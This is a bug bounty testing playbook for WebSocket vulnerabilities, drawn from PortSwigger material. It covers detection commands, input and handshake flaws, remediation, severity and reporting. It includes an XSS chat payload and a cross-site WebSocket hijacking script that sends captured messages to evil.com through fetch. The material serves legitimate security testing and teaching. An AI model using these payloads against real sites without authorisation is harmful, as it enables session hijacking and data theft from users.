# WebSockets Testing Playbook — Bug Bounty

> Source: PortSwigger Web Security Academy. WS message/connection manipulation.

---

## Core Concept

WS = long-lived HTTP-initiated bidirectional connection. **Virtually any HTTP vuln can arise over WS.** Test with Burp: intercept/modify messages (Proxy Intercept tab), replay/generate messages (Repeater, bidirectional), manipulate handshake (Repeater pencil icon: attach / clone / reconnect with edited handshake).

Handshake manipulation needed when: more attack surface, connection drops, stale tokens in original handshake.

---

## Quick Detection

```bash
# Find WS endpoints in page JS
curl -s https://TARGET/ | grep -oP 'wss?://[^"'"'"']+'

# Handshake without Origin check (CSWSH test)
curl -sI https://TARGET/ws \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Origin: https://evil.com' | head -5
# 101 Switching Protocols = handshake accepted from foreign origin
```

---

## Vulnerability Types

### V1 — Input-based via message tampering
User-supplied input in WS messages processed unsafely server-side:
- SQLi, XXE via WS message content
- Blind vulns → detect via **OAST** only
- Attacker-controlled data transmitted to other users → **XSS**: e.g. chat message `{"message":"<img src=1 onerror='alert(1)'>"}` rendered as `<td>` to other users

### V2 — Handshake-based (design flaws)
- Misplaced trust in HTTP headers for security decisions (`X-Forwarded-For`)
- Session handling flaws: message session context determined by handshake session
- Custom HTTP headers introducing attack surface

### V3 — Cross-site WebSocket hijacking (CSWSH)
Cross-domain WS connection from attacker site = **CSRF on the WS handshake**. Impact often serious: privileged actions as victim, capture sensitive data.

```html
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onmessage = function(e){ fetch('https://evil.com/log?d='+encodeURIComponent(e.data)); };
ws.onopen = function(){ ws.send('GET_SENSITIVE'); };
</script>
```
Victim's browser auto-attaches cookies at handshake (if no Origin/CSRF check).

---

## Secure-by-Design Reference (remediation)

1. Use `wss://` (TLS)
2. Hardcode WS endpoint URL — no user-controllable data in URL
3. Protect handshake against CSRF (→ prevents CSWSH)
4. Treat WS data as untrusted in BOTH directions (server + client side handling)

---

## By-Design Filters (SKIP)

- Public chat WS, no auth, no sensitive data
- Server escapes/sanitizes WS messages before broadcast (verify first!)
- Handshake requires custom token beyond cookies (CSWSH blocked)
- `wss://` + Origin validation (verify config correctness)

---

## Severity Guide

| Impact | Severity |
|---|---|
| SQLi/XXE via WS message | HIGH (chain-dependent) |
| CSWSH → privileged actions / data capture as victim | HIGH |
| WS message → XSS to other users | MEDIUM–HIGH |
| Blind vuln via WS (OAST-confirmed) | MEDIUM |
| Handshake header trust (info leak) | LOW / INFO |
| Public unauthenticated WS, no sensitive data | INFO |

---

## Reporting Checklist

- [ ] WS endpoint + handshake details
- [ ] Message format + injection point
- [ ] Vuln type: input-based / handshake / CSWSH
- [ ] Origin validation status (evidence)
- [ ] Impact: data exposed or action triggered

> ⚠️ CSWSH needs AUTHENTICATED sensitive data on the WS. Blocked/unauth chain = INFO (master KB rule).